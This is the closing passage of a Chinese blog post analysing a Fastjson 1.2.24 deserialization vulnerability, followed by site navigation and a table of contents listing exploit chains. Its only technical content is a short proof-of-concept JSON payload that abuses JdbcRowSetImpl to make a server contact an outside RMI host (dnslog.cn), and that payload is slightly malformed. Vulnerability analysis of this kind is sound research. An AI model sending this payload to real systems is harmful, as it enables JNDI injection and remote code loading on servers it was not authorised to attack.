<h4 id="2-4-3-Poc"><a href="#2-4-3-Poc" class="headerlink" title="2.4.3 Poc"></a>2.4.3 Poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">    &quot;autoCommit&quot; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A8%A1%E6%8B%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">1. 模拟命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DNS%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DNS请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-java-net-Inet4Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 java.net.Inet4Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-%E5%86%85%E7%BD%AE%E6%9C%89deserializer%E5%AF%B9%E5%BA%94%E7%9A%84%E7%B1%BB%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 补充-内置有deserializer对应的类名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-Inet4Address%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.2 补充-Inet4Address解析域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-java-net-URL"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4 java.net.URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5 poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%B3%A8%E6%84%8F%E7%A7%81%E6%9C%89%E5%AD%97%E6%AE%B5%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 注意私有字段的赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 数组类型的变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-getOutputProperties"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 getOutputProperties</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-%E7%BB%93%E5%90%88CB%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4 结合CB利用链的新思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 BCEL利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-BasicDataSource%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 BasicDataSource关键类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-JSON-parseObject"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 JSON.parseObject()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-1-JSON-toJSON-obj"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.2.1 JSON.toJSON(obj)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-2-createJavaBeanSerializer%E5%92%8CcreateASMSerializer%E4%B8%AD%E5%88%9B%E5%BB%BAsortedGetters"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-3-FieldInfo-get-%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91invoke%E6%89%A7%E8%A1%8C"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.2.3 FieldInfo.get()方法触发invoke执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8JSON-parse-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 如何使用JSON.parse()触发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-1-Type%E4%B8%BAJSONObject%E7%B1%BB%E6%97%B6"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">2.3.3.1 @Type为JSONObject类时</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-2-%E6%89%A7%E8%A1%8C%E5%88%B0key-toString-%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">2.3.3.2 执行到key.toString()方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-3-%E8%A7%A6%E5%8F%91invoke"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">2.3.3.3 触发invoke</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-4-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.3.4.</span> <span class="toc-text">2.3.3.4 poc构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-4-%E5%9B%9E%E6%98%BE%E5%92%8C%E5%86%85%E5%AD%98%E9%A9%ACEXP"><span class="toc-number">2.3.4.</span> <span class="toc-text">2.3.4 回显和内存马EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-1-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">2.3.4.1 恶意代码块位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-2-%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">2.3.4.2 弹出计算器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.4.3.</span> <span class="toc-text">2.3.4.3 回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-4-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.4.4.</span> <span class="toc-text">2.3.4.4 内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-JNDI%E8%B0%83%E7%94%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 JNDI调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%A7%A6%E5%8F%91%E9%93%BEsetAutoCommit"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 触发链setAutoCommit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Poc"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 Poc</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.24漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.24漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.24漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.24漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.24漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2017-2022
    ninefiger
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
